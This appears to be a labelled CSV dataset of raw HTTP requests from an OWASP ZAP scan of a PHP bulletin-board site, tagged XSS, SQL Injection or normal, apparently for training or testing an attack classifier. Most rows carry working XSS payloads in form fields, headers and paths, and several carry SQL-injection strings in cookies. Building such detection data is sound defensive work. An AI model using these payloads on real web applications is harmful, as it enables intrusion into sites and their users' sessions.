,id,combined_request,label_x,gpt_label
734,363b7aaf-d3f8-4aea-aeed-56d1575d87f9,"POST /bbs/write_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/write.php?bo_table=qa&device=pc&w=r&wr_id=3\r\ncontent-length: 1012\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nuid=2023110315225029&w=r&bo_table=qa&wr_id=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&sca=&sfl=&stx=&spt=&sst=&sod=&page=&wr_name=ZAP&wr_password=ZAP&wr_email=ZAP&wr_homepage=ZAP&html=&wr_subject=Re%3A+%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94...%ED%85%8C%EC%8A%A4%ED%8A%B8+%EC%A0%90%EA%B2%80+%EC%9E%85%EB%8B%88%EB%8B%A4.&wr_content=%0A%0A%0A+%3E+%0A+%3E+%0A+%3E+%EC%94%A8%ED%8B%B0%EC%95%84%EC%9D%B4%EB%9E%A9%0D%0A%3E+%0D%0A%3E+%EB%B3%B4%EC%95%88%EA%B8%B0%EC%88%A0%ED%8C%80%0D%0A%3E+%0D%0A%3E+%0D%0A%3E+%0D%0A%3E+%3Cscript%3E%0D%0A%3E+++++alert%28%27test%27%29%3B%0D%0A%3E+++++%2F%2F+%EA%B3%B5%EA%B2%A9%EC%9E%90%EB%8A%94+%EC%82%AC%EC%9A%A9%EC%9E%90%EC%9D%98+%EC%84%B8%EC%85%98+%EC%BF%A0%ED%82%A4%EB%A5%BC+%ED%83%88%EC%B7%A8%ED%95%98%EA%B1%B0%EB%82%98+%EB%8B%A4%EB%A5%B8+%EC%95%85%EC%9D%98%EC%A0%81%EC%9D%B8+%EC%9E%91%EC%97%85%EC%9D%84+%EC%88%98%ED%96%89%ED%95%A0+%EC%88%98+%EC%9E%88%EC%9D%8C%0D%0A%3E+%3C%2Fscript%3E%0A+%3E+%0A+%3E+&wr_link1=ZAP&wr_link2=ZAP&bf_file%5B%5D=test_file.txt&captcha_key=ZAP",XSS,XSS
735,1b529b2c-3569-4948-af10-46208648dd92,"POST /bbs/delete_comment.php?token=1698992570654491ba135b0 HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password.php?bo_table=free&comment_id=12&page=1&sod=desc&sop=and&sst=wr_datetime&w=x\r\ncontent-length: 120\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=x&bo_table=free&wr_id=0&comment_id=12&sfl=&stx=&page=1&wr_password=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E",XSS,XSS
736,49264bb8-fd33-4cbc-af9d-1d0cdfc6b6af,POST /bbs/write.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: '\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password.php?bo_table=free&page=1&sod=desc&sop=and&sst=wr_hit&w=u&wr_id=14\r\ncontent-length: 121\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=u&bo_table=free&wr_id=14&comment_id=&sfl=&stx=&page=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&wr_password=ZAP,XSS,XSS
737,76d5a98d-1153-47e5-afbc-5cbe4507488f,"POST /bbs/new.php?query=%22%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/new.php\r\ncontent-length: 49\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nsw=move&view=&sfl=&stx=&bo_table=&page=1&pressed=",XSS,XSS
738,82495383-4af5-4b2a-afc1-169f1f5979f1,GET /bbs/ajax.autosaveload.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: 0W45pz4p\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\ncookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D+AND+1%3D2+--+; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n,SQL Injection,SQL Injection
739,07829e2f-adc1-4b59-afd9-d64d8c9fe948,"POST /bbs/register_form_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/register_form.php\r\ncontent-length: 317\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=&url=https%3A%2F%2Fzap.example.com&agree=1&agree2=1&cert_type=&cert_no=&mb_sex=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&mb_id=ZAP&mb_password=ZAP&mb_password_re=ZAP&mb_name=ZAP&mb_nick_default=&mb_nick=ZAP&old_email=&mb_email=foo-bar%40example.com&mb_mailling=1&mb_open=1&mb_open_default=&captcha_key=ZAP",XSS,XSS
740,ba643ded-2f55-42e8-afff-55ce0b161416,"POST /bbs/ajax.filter.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nProxy-Connection: keep-alive\r\nContent-Length: 24\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nDNT: ' <scrIpt>alert(1);</scRipt>\r\nX-Requested-With: XMLHttpRequest\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nOrigin: http://211.115.206.18:7000\r\nReferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&wr_id=14\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\ncookie: session=888528ee-2a6a-4ff0-af70-626b88bbabf2.R689nM5K2XUhRZY9KF21PDU5K4o; PHPSESSID=svf0hn53ffquep1qfna3un5gma; 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%27%29+UNION+ALL+select+NULL+--+; ck_font_resize_rmv_class=; ck_font_resize_add_class=; io=AudecAd7mjzynVA7AAI-; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nsubject=&content=1232131",XSS,XSS
741,a6716dd2-94a2-420a-b021-05d31d3567e2,GET /bbs/_common.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: ' <img src=x onerror=prompt()>\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\ncookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%29+UNION+ALL+select+NULL+--+; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n,XSS,SQL Injection
742,2029f0cd-dc76-4484-b041-d35a56bacc8c,"POST /bbs/write_comment_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&c_id=15&page=1&sod=desc&sop=and&sst=wr_hit&w=c&wr_id=14\r\ncontent-length: 157\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=c&bo_table=free&wr_id=14&comment_id=15&sca=&sfl=&stx=&spt=0W45pz4p&page=1&is_good=&wr_content=&wr_name=ZAP&wr_password=ZAP&captcha_key=ZAP&wr_secret=secret",normal,normal
743,25d79515-8e69-4c15-b044-59a3a1f86f75,"POST /bbs/new.php?device=%22%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&gr_id=community&mb_id=ZAP&view=w HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/new.php?device=pc&gr_id=community&mb_id=ZAP&view=w\r\ncontent-length: 50\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nsw=move&view=w&sfl=&stx=&bo_table=&page=1&pressed=",XSS,XSS
744,37570579-43fc-4665-b04f-4b5ebe1f031e,"POST /bbs/board_list_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&page=1&sca&sfl&sfl=wr_content&sod=asc&sop=and&sst=wr_datetime&stx&stx=ZAP\r\ncontent-length: 152\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nbo_table=free&sfl=wr_content&stx=ZAP&spt=-7&sca=&sst=wr_datetime&sod=asc%27+AND+%271%27%3D%271&page=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&sw=",SQL Injection,SQL Injection
745,1f79c9d7-4d90-4663-b056-2f718c21015e,"POST /bbs/password_lost2.php HTTP/1.1\r\nhost: javascript:alert(1);\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password_lost.php\r\ncontent-length: 28\r\ncookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%27+AND+%271%27%3D%271%27+--+; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\nmb_email=ZAP&captcha_key=ZAP",XSS,XSS
746,dca6b6a9-d0d4-4cc9-b057-c0f870986438,"POST /bbs/write_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/write.php?bo_table=qa&device=pc&w=r&wr_id=3\r\ncontent-length: 973\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nuid=2023110315225029&w=r&bo_table=qa&wr_id=3&sca=0W45pz4p&sfl=&stx=&spt=&sst=&sod=&page=&wr_name=ZAP&wr_password=ZAP&wr_email=ZAP&wr_homepage=ZAP&html=&wr_subject=Re%3A+%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94...%ED%85%8C%EC%8A%A4%ED%8A%B8+%EC%A0%90%EA%B2%80+%EC%9E%85%EB%8B%88%EB%8B%A4.&wr_content=%0A%0A%0A+%3E+%0A+%3E+%0A+%3E+%EC%94%A8%ED%8B%B0%EC%95%84%EC%9D%B4%EB%9E%A9%0D%0A%3E+%0D%0A%3E+%EB%B3%B4%EC%95%88%EA%B8%B0%EC%88%A0%ED%8C%80%0D%0A%3E+%0D%0A%3E+%0D%0A%3E+%0D%0A%3E+%3Cscript%3E%0D%0A%3E+++++alert%28%27test%27%29%3B%0D%0A%3E+++++%2F%2F+%EA%B3%B5%EA%B2%A9%EC%9E%90%EB%8A%94+%EC%82%AC%EC%9A%A9%EC%9E%90%EC%9D%98+%EC%84%B8%EC%85%98+%EC%BF%A0%ED%82%A4%EB%A5%BC+%ED%83%88%EC%B7%A8%ED%95%98%EA%B1%B0%EB%82%98+%EB%8B%A4%EB%A5%B8+%EC%95%85%EC%9D%98%EC%A0%81%EC%9D%B8+%EC%9E%91%EC%97%85%EC%9D%84+%EC%88%98%ED%96%89%ED%95%A0+%EC%88%98+%EC%9E%88%EC%9D%8C%0D%0A%3E+%3C%2Fscript%3E%0A+%3E+%0A+%3E+&wr_link1=ZAP&wr_link2=ZAP&bf_file%5B%5D=test_file.txt&captcha_key=ZAP",XSS,XSS
747,50b6ffc2-d828-42d7-b05f-43da59723018,"GET /bbs/_head.sub.php HTTP/1.1\r\nhost: ' .<scrIpt>alert(1);</scRipt>\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n",XSS,XSS
748,689aae90-a6ee-414b-b075-ccf911d39577,"POST /bbs/write_comment_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nProxy-Connection: keep-alive\r\ncontent-length: 183\r\nCache-Control: max-age=0\r\nOrigin: http://211.115.206.18:7000\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nReferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&wr_id=14\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\ncookie: session=888528ee-2a6a-4ff0-af70-626b88bbabf2.R689nM5K2XUhRZY9KF21PDU5K4o; PHPSESSID=svf0hn53ffquep1qfna3un5gma; 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; ck_font_resize_rmv_class=; ck_font_resize_add_class=; io=AudecAd7mjzynVA7AAI-; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D+OR+1%3D1+--+\r\nx-zap-scan-id: 400token=bf37100ccabf723334f41a5832b10113&w=c&bo_table=free&wr_id=14&comment_id=&sca=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&sfl=&stx=&spt=&page=&is_good=0&wr_content=1232131",XSS,XSS
749,9757239c-fafc-4d68-b07c-a67ea9b1634e,"POST /bbs/board_list_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&page=1&sca&sfl=wr_content&sod=asc&sop=and&sst=wr_datetime&stx=ZAP\r\ncontent-length: 120\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nbo_table=%27%22%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E&sfl=wr_content&stx=ZAP&spt=-7&sst=wr_datetime&sod=asc&page=1&sw=",XSS,XSS
750,de42bf92-e530-4e2e-b0b9-0222ff1fea19,POST /bbs/write.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: '\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password.php?bo_table=free&page=1&sod=desc&sop=and&sst=wr_hit&w=u&wr_id=14\r\ncontent-length: 118\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=u&bo_table=free&wr_id=14&comment_id=&sfl=&stx=&page=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&wr_password=ZAP,XSS,XSS
751,303e5171-ac5e-4913-b0bf-63390ea8f35b,"POST /bbs/delete_comment.php?token=1698992570654491ba135b0 HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password.php?bo_table=free&comment_id=12&page=1&sod=desc&sop=and&sst=wr_datetime&w=x\r\ncontent-length: 80\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=x&bo_table=free&wr_id=0&comment_id=12&sfl=&stx=&page=1&wr_password=%3B0W45pz4p",SQL Injection,SQL Injection
752,560478d7-889c-473e-b0c5-cd7853980384,GET /bbs/_tail.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: ' <scrIpt>alert(1);</scRipt>\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n,XSS,XSS
753,25fc093b-ed7f-483c-b0c7-c84ab008a6c9,"POST /bbs/new.php?device=%22%3E%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/new.php?device=pc\r\ncontent-length: 49\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\nsw=move&view=&sfl=&stx=&bo_table=&page=1&pressed=",XSS,XSS
754,dcdf0f46-6dcf-4a9e-b0e4-98f0996a5e6a,"GET /bbs/?C=D;O=D HTTP/1.1\r\nhost: </address>.<scrIpt>alert(1);</scRipt><address>\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/?C=D;O=A\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n",XSS,XSS
755,4cc52c6f-9967-42eb-b10f-12a30319a019,"POST /bbs/ajax.filter.php HTTP/1.1\r\nhost: ' .<scrIpt>alert(1);</scRipt>\r\nProxy-Connection: keep-alive\r\nContent-Length: 24\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nDNT: 1\r\nX-Requested-With: XMLHttpRequest\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nOrigin: http://211.115.206.18:7000\r\nReferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&wr_id=14\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\ncookie: session=888528ee-2a6a-4ff0-af70-626b88bbabf2.R689nM5K2XUhRZY9KF21PDU5K4o; PHPSESSID=svf0hn53ffquep1qfna3un5gma; 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%27%29+UNION+ALL+select+NULL+--+; ck_font_resize_rmv_class=; ck_font_resize_add_class=; io=AudecAd7mjzynVA7AAI-; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nsubject=&content=1232131",XSS,XSS
756,b9023b2d-3c86-4fd2-b160-700b11a2e0b0,POST /bbs/write.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: '\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password.php?bo_table=free&page=1&sod=desc&sop=and&sst=wr_hit&w=u&wr_id=14\r\ncontent-length: 119\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=u&bo_table=free&wr_id=14&comment_id=&sfl=&stx=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&page=1&wr_password=ZAP,XSS,XSS
757,9b977bdd-f8d9-4b68-b162-c052fbf87423,"GET /bbs0W45pz4p/_head.sub.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n",normal,normal
758,79053e54-0766-43fc-b18c-162c1ad8c307,"POST /bbs/write_comment_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nProxy-Connection: keep-alive\r\ncontent-length: 176\r\nCache-Control: max-age=0\r\nOrigin: http://211.115.206.18:7000\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nReferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&wr_id=14\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\ncookie: session=888528ee-2a6a-4ff0-af70-626b88bbabf2.R689nM5K2XUhRZY9KF21PDU5K4o; PHPSESSID=svf0hn53ffquep1qfna3un5gma; 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; ck_font_resize_rmv_class=; ck_font_resize_add_class=; io=AudecAd7mjzynVA7AAI-; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D+OR+1%3D1+--+\r\nx-zap-scan-id: 400token=bf37100ccabf723334f41a5832b10113&w=c&bo_table=free&wr_id=%27%22%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E&comment_id=&sca=&sfl=&stx=&spt=&page=&is_good=0&wr_content=1232131",XSS,XSS
759,3b9a8eff-b0eb-4b5b-b1e3-b7860a356a45,"GET /'%22%00%3CscrIpt%3Ealert(1);%3C%2FscRipt%3E/_head.sub.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n",XSS,XSS
